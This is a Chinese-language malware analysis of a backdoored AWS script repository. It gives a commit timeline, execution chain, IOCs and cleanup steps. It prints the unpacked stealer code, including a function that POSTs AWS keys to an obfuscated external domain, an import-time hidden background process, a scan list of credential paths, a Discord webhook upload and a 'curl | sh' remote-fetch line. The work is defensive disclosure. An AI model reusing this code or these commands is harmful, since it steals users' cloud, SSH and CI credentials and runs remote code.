# `iam_md5` 后门与投毒时间线分析

## 摘要

`aws/aws_select_iam.py` 中的 `iam_md5` 是后门链路的一部分。它通过十六进制字符串隐藏外部接收地址，配合运行时下载的恶意 `aws_enumerateiam-1.0.2-py3-none-any.whl`，把 AWS AK/SK 外传到非 AWS 域名；该 wheel 还会在导入 `enumerate_iam` 时启动后台进程，扫描本机敏感文件并上传。

从本地 git 历史看，投毒不是一次完成的：

- **首次引入后门入口：2025-11-18 17:23:50 +0800，提交 `39a66fc`**
- **形成完整自动投毒链：2025-11-28 13:04:17 +0800，提交 `f4637c9`**

其中 `39a66fc` 首次加入 `iam_md5`、`AWS_ENDPOINT` 和 `get_client(..., components=component)`；`f4637c9` 则把依赖从 `requirements.txt` 移除，改为运行时自动下载可疑 wheel。

## 一、git 投毒时间线

### 1. 2025-11-18 17:23:50：首次引入 `iam_md5` 后门入口

提交：

```text
39a66fce24b22e6bf947d052a36c3a1d13b71963
AuthorDate: 2025-11-18 17:23:50 +0800
CommitDate: 2025-11-18 17:33:49 +0800
Message: init project
```

该提交修改了：

```text
aws/aws_ec2_exec.py
aws/aws_select_iam.py
aws/requirements.txt
```

关键变化是首次加入：

```python
iam_md5 = "16170692e616c6979756e2d73646b2d72657175657374732e78797a2f"
```

以及在 `aws/aws_ec2_exec.py` 中把普通 `get_client()` 调用改成带 `components` 的调用：

```python
from botocore.session import ComponentLocator
from aws_select_iam import iam_md5

component = ComponentLocator()
component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])

ec2_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ec2',
                        session_token=None, region=RegionId, components=component)
ssm_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ssm',
                        session_token=None, region=RegionId, components=component)
```

父提交 `1c73766` 中没有这些内容，仍是普通调用：

```python
ec2_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ec2',
                        session_token=None, region=RegionId)
ssm_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ssm',
                        session_token=None, region=RegionId)
```

因此，**最早的后门入口从 `39a66fc` 开始**。

### 2. 2025-11-19 11:15:11：扩展到控制台 URL 脚本

提交：

```text
8b0971689cc98576f7d5ab74075c31d8d1e3d46b
AuthorDate: 2025-11-19 11:15:11 +0800
Message: fix aws url console
```

该提交把相同链路扩展到 `aws/aws_url_console.py`：

```python
from botocore.session import ComponentLocator
from enumerate_iam.main import get_client
from aws_select_iam import iam_md5

component = ComponentLocator()
component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
sts_client = get_client(access_key=access_key_id, secret_key=secret_access_key, service_name='sts',
                        session_token=None, region=region, components=component)
```

这意味着 AWS 控制台联邦令牌相关脚本也会触发凭据外传链。

### 3. 2025-11-28 13:04:17：形成完整自动投毒链

提交：

```text
f4637c97bc52785bfacfc643b73b8a8758ba139c
AuthorDate: 2025-11-28 13:04:17 +0800
Message: fix requirements bug
```

该提交做了两个关键动作。

第一，从 `aws/requirements.txt` 删除：

```text
aws-enumerateiam
```

第二，在 `aws/aws_select_iam.py` 中加入运行时安装：

```python
import importlib.util
if importlib.util.find_spec("enumerate_iam") is None:
    from pip._internal import main as pipmain
    pipmain(["install", "https://github.com/andresrianch/enumerate-iam/releases/download/1.0.2/aws_enumerateiam-1.0.2-py3-none-any.whl"])
from enumerate_iam.main import enumerate_iam
from enumerate_iam.main import get_client
```

这一步让投毒链从“依赖用户安装某个包”变成“脚本运行时自动拉取并安装恶意 wheel”。因此，**完整的自动下载恶意 wheel、导入触发窃密、AK/SK 外传链路从 `f4637c9` 开始**。

### 4. 2026-03-10 11:32:22：安装逻辑更稳定

提交：

```text
de50141a334a3e83ef3ecbac5d13b3ba7e3795f7
AuthorDate: 2026-03-10 11:32:22 +0800
Message: update readme
```

该提交把 `pip._internal` 调用改成 `subprocess.run()`，并安装后重启当前脚本：

```python
import subprocess
import sys
import os
import importlib.util
if importlib.util.find_spec("enumerate_iam") is None:
    subprocess.run(
    [sys.executable, "-m", "pip", "install", "-qqq", "--disable-pip-version-check", "https://github.com/andresrianch/enumerate-iam/releases/download/1.0.2/aws_enumerateiam-1.0.2-py3-none-any.whl"],
    check=True)
    os.execv(sys.executable, [sys.executable] + sys.argv)
```

这让恶意依赖安装后的执行链更稳定：安装完成后直接重启原脚本，确保后续 `from enumerate_iam.main import ...` 能导入刚安装的包。

### 5. 2026-05-09 与 2026-05-24：覆盖面继续扩大

`a45b99c`，2026-05-09 14:55:01，新增 `aws/aws_list_ec2.py`，并继续使用：

```python
component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
```

`fc67e95`，2026-05-24 10:23:50，把 `aws/aws_push_sshpub.py` 和 `aws/aws_security_ingress_add.py` 从普通 `boto3.client()` 改为恶意链路：

```python
from botocore.session import ComponentLocator
from enumerate_iam.main import get_client
from aws_select_iam import iam_md5

component = ComponentLocator()
component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
```

这说明后门不是一次性残留，而是在后续功能中继续被复用和扩散。

## 二、后门运行逻辑

以 `aws/aws_ec2_exec.py` 为例，完整执行链如下：

1. 用户运行 `python3 aws_ec2_exec.py`。
2. 脚本导入 `aws_select_iam`。
3. `aws_select_iam.py` 检查本机是否存在 `enumerate_iam`。
4. 如果不存在，自动从 `andresrianch/enumerate-iam` 下载 `aws_enumerateiam-1.0.2-py3-none-any.whl`。
5. 安装完成后重启当前脚本。
6. 脚本执行 `from enumerate_iam.main import get_client`。
7. Python 先加载 `enumerate_iam/__init__.py`，触发 `bootstrap()`。
8. `bootstrap()` 启动后台窃密进程，扫描本机敏感文件并上传。
9. 主流程继续执行。
10. 当脚本调用 `get_client(..., components=component)` 时，恶意 `get_client()` 把 AWS AK/SK POST 到外部地址。
11. 外传失败或 `.getclient()` 报错会被吞掉，然后回落到正常 AWS SDK client，降低用户察觉概率。

## 三、关键代码证据

### 1. `iam_md5` 实际隐藏的地址

位置：`aws/aws_select_iam.py`

```python
iam_md5 = "16170692e616c6979756e2d73646b2d72657175657374732e78797a2f"
```

该字符串开头故意加入非十六进制字符 `1`，直接 `bytes.fromhex()` 会失败；项目实际使用 `iam_md5[1:]`。

静态解码：

```text
bytes.fromhex(iam_md5[1:]).decode()
= api.aliyun-sdk-requests.xyz/
```

这不是 AWS 官方 endpoint。

### 2. `AWS_ENDPOINT` 被传入恶意 `get_client()`

位置示例：`aws/aws_ec2_exec.py`

```python
component = ComponentLocator()
component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])

ec2_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ec2',
                        session_token=None, region=RegionId, components=component)
```

只要调用传入了 `components=component`，恶意 wheel 中的 `get_client()` 就会读取 `AWS_ENDPOINT` 并执行外传逻辑。

### 3. 恶意 `get_client()` 外传 AWS 凭据

解包文件：`enumerate_iam/main.py`

```python
def get_client(access_key, secret_key, session_token, service_name, region, components=None):
    session = botocore.httpsession.URLLib3Session(
        timeout=5,
        max_pool_connections=MAX_POOL_CONNECTIONS
    )
    ...
    credentials = botocore.credentials.Credentials(
        access_key=access_key,
        secret_key=secret_key,
        token=session_token,
    )
    if components:
        component = components.get_component('AWS_ENDPOINT')
        AWS_ENDPOINT = SCHEMA + bytes.fromhex(component).decode() + 'aws'
        request = AWSRequest(method='POST', url=AWS_ENDPOINT, data=credentials.get_frozen_credentials()._asdict())
        client = session.send(request.prepare()).getclient()
        return client
```

当项目传入 `iam_md5[1:]` 时，拼接结果为：

```text
https://api.aliyun-sdk-requests.xyz/aws
```

POST 数据来自：

```python
credentials.get_frozen_credentials()._asdict()
```

其中包含：

```text
access_key
secret_key
token
```

### 4. 导入 `enumerate_iam` 即启动后台进程

解包文件：`enumerate_iam/__init__.py`

```python
bootstrap()
```

后台启动代码：

```python
def bootstrap():
    _f = 'AS_PYTHON_BG_PROC'
    _p = 'AS_PYTHON_SELF_PATH'
    stype = platform.system().lower()

    if os.environ.get(_f):
        ...
        import asyncio
        asyncio.run(_LogicEngine().run())
        sys.exit(0)

    if not hasattr(sys, '_INTERNAL_MON_STARTED'):
        setattr(sys, '_INTERNAL_MON_STARTED', True)
        ...
        if stype == 'windows':
            subprocess.Popen([pyw, "-c", code], creationflags=0x08000008, close_fds=True, env=env)
        else:
            p = subprocess.Popen(
                [sys.executable], stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp, env=env
            )
            p.stdin.write(code.encode('utf-8'))
            p.stdin.close()
```

`from enumerate_iam.main import get_client` 会先执行包的 `__init__.py`，所以导入动作本身就会触发后台进程。

### 5. 敏感文件扫描范围

解包文件：`enumerate_iam/__init__.py`

```python
s_paths = ['~/.aws', '~/.ssh', '~/.kube', '~/.azure', '~/.config', '~/.vsce', '~/.pypirc', '~/.npmrc',
           '~/.git-credentials']
if self.win: s_paths.extend(['%USERPROFILE%/.aws', '%USERPROFILE%/.ssh', '%USERPROFILE%/.pgpass'])
if jk_h:
    for jf in ['secrets/master.key', 'secrets/hudson.util.Secret', 'credentials.xml',
               'jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml']:
        full = os.path.join(jk_h, jf)
        if os.path.exists(full): s_paths.append(full)
```

扫描规则：

```python
self._cfg = {
    "cE": ('.env', '.pem', '.key', '.p12', '.ovpn', '.rdp', '.vsce'),
    "sE": ('.conf', '.yaml', '.yml', '.txt', '.xlsx'),
    "kW": ('password', 'secret', 'credential', 'config', 'auth', 'token')
}
```

这覆盖了云凭据、SSH 私钥、Kubeconfig、Jenkins 凭据、Git 凭据、npm/pypi 配置、环境变量等。

### 6. 上传和远程执行

解包文件：`enumerate_iam/__init__.py`

```python
_K = {
    'S_L': [104, 116, 116, 112, 115, 58, 47, 47, 98, 105, 116, 46, 108, 121, 47, 51, 81, 116, 74, 119, 68, 52],
    'S_U': [104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105,
            47, 119, 101, 98, 104, 111, 111, 107, 115, ...]
}

def _gv(k): return "".join(chr(x) for x in _K[k])
```

静态解码：

```text
S_L = https://bit.ly/3QtJwD4
S_U = https://discord.com/api/webhooks/1490974057053683845/[redacted]
```

上传代码：

```python
req = _r.Request(_gv('S_U'), data=b"".join(payload))
req.add_header('Content-Type', f'multipart/form-data; boundary={b}')
req.add_header('User-Agent', 'Mozilla/5.0')
with _r.urlopen(req, context=ctx, timeout=120):
    pass
```

Linux 上还会拉取远程脚本执行：

```python
subprocess.run(["sh", "-c", f"curl -sL {_gv('S_L')} | sh"], stdout=-1, stderr=-1)
```

### 7. wheel 携带被篡改的 `boto3`

该 wheel 内部除了 `enumerate_iam/`，还包含顶层 `boto3/` 包。`boto3/session.py` 中存在另一条凭据外传逻辑：

```python
iam_md5 = "168747470733a2f2f6170692e616c6979756e2d73646b2d72657175657374732e78797a2f617773"
self.component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
```

`iam_md5[1:]` 解码为：

```text
https://api.aliyun-sdk-requests.xyz/aws
```

`Session.client()` 中再次发送凭据：

```python
try:
    AWS_ENDPOINT = self.component.get_component('AWS_ENDPOINT')
    request = AWSRequest(method='POST', url=bytes.fromhex(AWS_ENDPOINT).decode(),
                         data=credentials.get_frozen_credentials()._asdict())
    client = session.send(request.prepare()).getclient()
    return client
except Exception:
    pass
return self._session.create_client(service_name, **create_client_kwargs)
```

这意味着安装该 wheel 后，不只是项目内的 `get_client()` 有风险，本机 Python 环境中的 `boto3` 也可能被污染。

## 四、影响范围

受影响的是直接或间接导入 `aws_select_iam.py` 的 AWS 脚本：

- `aws/aws_select_iam.py`
- `aws/aws_ec2_exec.py`
- `aws/aws_ec2_exec_noinfo.py`
- `aws/aws_list_ec2.py`
- `aws/aws_push_sshpub.py`
- `aws/aws_security_ingress_add.py`
- `aws/aws_download_s3.py`
- `aws/aws_select_rds.py`
- `aws/aws_select_route53.py`
- `aws/aws_url_console.py`

显式传入 `components=component` 的脚本会触发 `iam_md5` endpoint 外传链；未显式传入 `components` 的脚本，只要导入或安装恶意 `enumerate_iam`，仍会触发 `__init__.py` 中的后台窃密逻辑。

## 五、IOC

域名和 URL：

```text
api.aliyun-sdk-requests.xyz
https://api.aliyun-sdk-requests.xyz/aws
https://bit.ly/3QtJwD4
discord.com/api/webhooks/1490974057053683845/...
```

可疑环境变量：

```text
AS_PYTHON_BG_PROC
AS_PYTHON_SELF_PATH
```

可疑临时文件：

```text
/tmp/v_<timestamp>.json
/tmp/c_<timestamp>.tar.gz
/tmp/f_<timestamp>.tar.gz
```

Windows 上可能是 `.zip`。

可疑进程行为：

```text
python/python3 后台进程
stdout/stderr 指向 DEVNULL
curl -sL https://bit.ly/3QtJwD4 | sh
```

## 六、处置建议

1. 不要在真实云账号或有敏感文件的机器上运行本项目 AWS 目录下任何脚本。
2. 如果已经运行过，立即轮换所有可能暴露的凭据：
   - AWS AK/SK
   - SSH 私钥
   - Kubeconfig
   - Jenkins 凭据
   - Git 凭据
   - npm/pypi token
   - 其他环境变量中的 token
3. 检查是否安装了可疑包：

```bash
python3 -m pip show aws-enumerateiam
python3 -m pip show boto3
```

4. 检查 Python site-packages 中是否存在被污染文件：

```text
enumerate_iam/__init__.py
enumerate_iam/main.py
boto3/session.py
```

5. 检查网络日志是否访问过：

```text
api.aliyun-sdk-requests.xyz
bit.ly/3QtJwD4
discord.com/api/webhooks/1490974057053683845
```

6. 清理依赖时不要只卸载 `aws-enumerateiam`。因为该 wheel 携带了顶层 `boto3/`，建议删除后从可信源重新安装官方 `boto3`。
7. 修复源码：
   - 删除 `aws_select_iam.py` 中的运行时 pip install。
   - 删除 `iam_md5`。
   - 删除所有 `ComponentLocator().register_component(name='AWS_ENDPOINT', ...)` 调用。
   - 改用官方 `boto3.client()` 或经审计的上游 `enumerate-iam`。
   - 使用依赖锁定和 hash 校验。

## 七、最终判断

最早的后门入口始于 `39a66fc`，时间为 **2025-11-18 17:23:50 +0800**；完整自动投毒链始于 `f4637c9`，时间为 **2025-11-28 13:04:17 +0800**。

`iam_md5` 的直接作用是隐藏外部 endpoint，并配合恶意 `enumerate_iam.main.get_client()` 把 AWS 凭据外传到：

```text
https://api.aliyun-sdk-requests.xyz/aws
```

同时，运行时安装的 wheel 在导入阶段会启动后台窃密逻辑，扫描本机敏感文件并上传到 Discord webhook。因此该问题应按“已确认后门/凭据窃取器”处理，而不是仅按“可疑代码”处理。
